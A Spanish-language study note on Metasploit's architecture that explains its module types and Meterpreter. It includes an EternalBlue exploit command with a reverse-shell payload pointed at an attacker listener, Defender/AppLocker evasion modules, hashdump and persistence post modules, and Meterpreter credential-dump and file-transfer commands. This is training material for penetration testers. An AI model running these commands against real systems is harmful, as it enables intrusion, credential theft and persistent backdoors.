# 🧩 Componentes Principales de Metasploit
**Path:** Jr Penetration Tester  
**Módulo:** Metasploit  
**Tema:** Arquitectura y módulos del framework

---

## ¿Qué es Metasploit?

Metasploit es el framework de explotación más usado en pentesting. No es una sola herramienta — es una colección de módulos organizados que cubren desde el escaneo inicial hasta la post-explotación, todo desde una sola consola.

La interfaz principal se llama **msfconsole** y se lanza así:

```bash
msfconsole
```

Desde ahí controlas todo: buscas módulos, los configuras, los ejecutas y gestionas las sesiones activas.

> [!info] Antes de los módulos — tres conceptos clave
> Estos términos aparecen constantemente en Metasploit y en pentesting en general:
>
> **Vulnerabilidad** — Un fallo en el diseño, código o lógica de un sistema. Puede ser que el software no valide bien los inputs, que use una versión desactualizada con bugs conocidos, o que esté mal configurado. La vulnerabilidad en sí misma no hace nada — es la puerta.
>
> **Exploit** — El código que aprovecha esa puerta. El exploit sabe exactamente cómo abusar de esa vulnerabilidad específica para conseguir que el sistema haga algo que no debería.
>
> **Payload** — Lo que se ejecuta en el sistema después de que el exploit funciona. El exploit abre la puerta; el payload es lo que entra por ella. Puede ser una reverse shell, un comando puntual, la creación de un usuario, lo que necesites.
>
> ```
> Vulnerabilidad → la puerta con cerradura rota
> Exploit        → la llave que la abre
> Payload        → lo que haces una vez que estás dentro
> ```

---

## Los módulos de Metasploit

Metasploit organiza todo en **módulos**: componentes independientes, cada uno diseñado para una tarea específica. Se ubican en `/opt/metasploit-framework/embedded/framework/modules/`.

---

### 1. Auxiliary — Herramientas de soporte

```
auxiliary/
├── scanner/     ← escaneo de puertos, servicios, versiones
├── fuzzers/     ← envía inputs malformados para encontrar crashes
├── crawler/     ← recorre aplicaciones web automáticamente
├── sqli/        ← pruebas de SQL injection
├── dos/         ← ataques de denegación de servicio (solo en labs)
├── gather/      ← recolección de información
└── sniffers/    ← captura de tráfico de red
```

Los módulos auxiliary **no explotan** nada — preparan el terreno. Son tus herramientas de reconocimiento y análisis dentro de Metasploit.

```bash
# Ejemplo: escanear hosts con SMB activo en una red
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run
```

> [!tip] Uso real
> Antes de lanzar un exploit, se usa auxiliary para confirmar que el servicio vulnerable realmente está corriendo y en qué versión. Así no "disparas a ciegas".

---

### 2. Encoders — Codificadores de payloads

Los encoders transforman el payload para que su apariencia binaria cambie y los antivirus basados en firmas no lo reconozcan.

```bash
# Ver encoders disponibles
show encoders

# El más conocido
use encoder/x86/shikata_ga_nai
```

> [!warning] Ojo con las expectativas
> Los encoders **no son evasión garantizada**. Los antivirus modernos hacen análisis de comportamiento (sandboxing, heurística), no solo comparación de firmas. Un payload codificado con shikata_ga_nai probablemente siga siendo detectado por Windows Defender o cualquier AV actualizado. Para evasión real se usan los módulos de **Evasion** o técnicas más avanzadas.

---

### 3. Evasion — Bypass de antivirus

A diferencia de los encoders, los módulos de evasion están diseñados específicamente para bypassear soluciones de seguridad de Windows: Windows Defender, AppLocker, etc.

```
evasion/windows/
├── applocker_evasion_install_util.rb
├── applocker_evasion_msbuild.rb
├── windows_defender_exe.rb
└── windows_defender_js_hta.rb
```

> [!info] AppLocker
> AppLocker es una función de Windows que permite a los administradores definir qué aplicaciones pueden ejecutarse en el sistema. Los módulos de evasion buscan binarios legítimos de Windows que AppLocker suele permitir (`msbuild.exe`, `installutil.exe`) para usarlos como "contenedores" del payload — técnica conocida como **Living off the Land (LotL)**.

---

### 4. Exploits — El núcleo del framework

Los exploits están organizados por sistema operativo objetivo:

```
exploits/
├── windows/     ← la categoría más grande
├── linux/
├── android/
├── apple_ios/
├── multi/       ← exploits multiplataforma (muy importantes)
├── webapp/      ← aplicaciones web
└── ...
```

La carpeta `multi/` es especialmente útil porque contiene exploits que funcionan en varios sistemas operativos, incluyendo handlers para recibir reverse shells de cualquier plataforma.

```bash
# Flujo básico para usar un exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST 10.10.14.5
set LPORT 4444
set PAYLOAD windows/x64/shell/reverse_tcp
run
```

---

### 5. NOPs — Relleno de payloads

NOP significa **No Operation** — en procesadores x86 se representa con el byte `0x90`. Es una instrucción que literalmente no hace nada: el procesador la lee y pasa a la siguiente.

¿Para qué sirven en pentesting?

```
┌────────────────────────────────────────────────────────────────┐
│  NOP SLED — para qué se usan los NOPs                         │
└────────────────────────────────────────────────────────────────┘

En exploits de buffer overflow, el payload necesita estar en una
dirección de memoria exacta. Si el atacante no sabe exactamente
dónde caerá el stack pointer, puede poner un bloque largo de NOPs
antes del shellcode:

[ NOP NOP NOP NOP NOP NOP ... NOP NOP | SHELLCODE ]

Si el procesador "cae" en cualquier NOP del bloque, simplemente
avanza hasta llegar al shellcode. Es como una rampa de aterrizaje.
```

También se usan para ajustar el tamaño del payload a lo que espera el exploit.

---

### 6. Payloads — Lo que se ejecuta en el objetivo

Esta es la categoría más importante de entender bien, porque aquí hay terminología que se mezcla y confunde.

```
payloads/
├── singles/    ← payloads autónomas
├── stagers/    ← establece la conexión
├── stages/     ← se descarga después del stager
└── adapters/   ← convierte payloads a otros formatos
```

#### Singles (payloads inline / autónomas)

Se ejecutan de una sola vez, sin necesitar descargar nada más. Son más grandes pero más simples.

```bash
# Ejemplos de singles
windows/shell_reverse_tcp      # shell inversa, todo en uno
windows/adduser                # crea un usuario en el sistema
windows/exec                   # ejecuta un comando puntual
```

#### Staged payloads (por etapas)

Se dividen en dos partes que trabajan juntas:

```
┌────────────────────────────────────────────────────────────────┐
│  CÓMO FUNCIONA UNA STAGED PAYLOAD                             │
└────────────────────────────────────────────────────────────────┘

  [1] Stager — muy pequeño, cabe en espacios limitados
      │  Su único trabajo: conectar con Metasploit
      │  y descargar la segunda parte
      │
      ▼
  [2] Stage — el payload real (Meterpreter, shell, VNC...)
      Se descarga desde Metasploit una vez establecida
      la conexión del stager
```

La ventaja es que el stager es pequeño — útil cuando el buffer overflow solo tiene espacio para pocos bytes. La desventaja es que requiere que el sistema objetivo tenga conectividad hacia afuera para descargar la stage.

#### ¿Cómo distinguirlos en el nombre?

Metasploit usa una convención de nombres que lo indica directamente:

```
generic/shell_reverse_tcp          ← SINGLE (guion bajo entre shell_reverse)
windows/x64/shell/reverse_tcp      ← STAGED (barra entre shell/reverse)

La regla:
  shell_reverse_tcp  →  guion bajo (_)  →  payload SINGLE (inline)
  shell/reverse_tcp  →  barra (/)       →  payload STAGED
```

> [!tip] ¿Cuál usar?
> ```
> Usa SINGLE cuando:
> → El espacio disponible para el payload no es problema
> → Quieres simplicidad — menos cosas que pueden fallar
> → El objetivo no tiene acceso a Internet para descargar la stage
>
> Usa STAGED cuando:
> → El exploit tiene límite de tamaño estricto
> → Quieres cargar Meterpreter (que es grande y siempre es staged)
> → La conexión inicial es confiable
> ```

#### Adapters

Envuelven un payload existente en otro formato. El caso más común es convertir un payload en un comando de PowerShell:

```bash
# Un payload normal convertido a PowerShell oneliner
use payload/windows/x64/powershell_reverse_tcp
```

---

### 7. Post — Post-explotación

Los módulos post se usan **después** de comprometer el sistema. Requieren una sesión activa (una Meterpreter o shell ya establecida).

```
post/
├── windows/     ← dump de credenciales, escalada, persistencia
├── linux/       ← recolección de info, movimiento lateral
├── multi/       ← comandos post-explot multiplataforma
└── ...
```

```bash
# Ejemplos de módulos post comunes
post/multi/recon/local_exploit_suggester   # sugiere privesc según el sistema
post/windows/gather/hashdump               # extrae hashes de contraseñas
post/windows/manage/persistence            # instala backdoor persistente
post/multi/manage/shell_to_meterpreter     # convierte shell básica a Meterpreter
```

---

## Meterpreter — el payload estrella de Metasploit

Aunque el módulo de THM no lo detalla aún, Meterpreter merece mención aquí porque aparece constantemente como payload recomendado.

Meterpreter es una **stage** — un payload avanzado que, una vez cargado en el sistema objetivo, da una sesión interactiva con funciones propias sin necesidad de escribir archivos al disco:

```bash
# Comandos propios de Meterpreter (no son comandos del OS)
sysinfo          # info del sistema
getuid           # usuario actual
getsystem        # intenta escalar a SYSTEM/root automáticamente
hashdump         # extrae hashes de contraseñas de Windows
download archivo # descarga un archivo del objetivo
upload archivo   # sube un archivo al objetivo
screenshot       # captura pantalla del objetivo
shell            # abre una shell del OS dentro de Meterpreter
background       # manda la sesión al background (vuelves a msfconsole)
```

> [!warning] Meterpreter y el disco
> Meterpreter corre completamente en memoria RAM — no escribe ejecutables al disco. Eso lo hace más difícil de detectar por antivirus tradicionales que monitorean archivos. Sin embargo, las soluciones EDR modernas pueden detectarlo por comportamiento en memoria.

---

## Resumen visual de los módulos

```
┌───────────────────────────────────────────────────────────────────┐
│  MÓDULOS DE METASPLOIT — PARA QUÉ SIRVE CADA UNO                 │
├──────────────┬────────────────────────────────────────────────────┤
│  auxiliary   │ Escaneo, recon, fuzzing — sin explotar nada        │
│  encoders    │ Ofuscar payload para evadir firmas AV              │
│  evasion     │ Bypass de Defender y AppLocker en Windows          │
│  exploits    │ El código que aprovecha una vulnerabilidad         │
│  nops        │ Relleno para ajustar tamaño y crear NOP sleds      │
│  payloads    │ Lo que se ejecuta en el objetivo tras el exploit   │
│  post        │ Acciones después de comprometer el sistema         │
└──────────────┴────────────────────────────────────────────────────┘

FLUJO TÍPICO EN METASPLOIT:
  auxiliary (recon) → exploit (entry) → payload (acceso) → post (profit)
```

> [!success] Por qué Metasploit importa
> Metasploit no es "hacer trampa" ni reemplaza entender las vulnerabilidades. Es una plataforma que automatiza la parte mecánica para que puedas enfocarte en lo que importa: entender qué estás explotando, por qué funciona, y cómo documentarlo. En el mundo real se usa tanto en red teams como en auditorías de seguridad — saber usarlo bien es una habilidad fundamental.
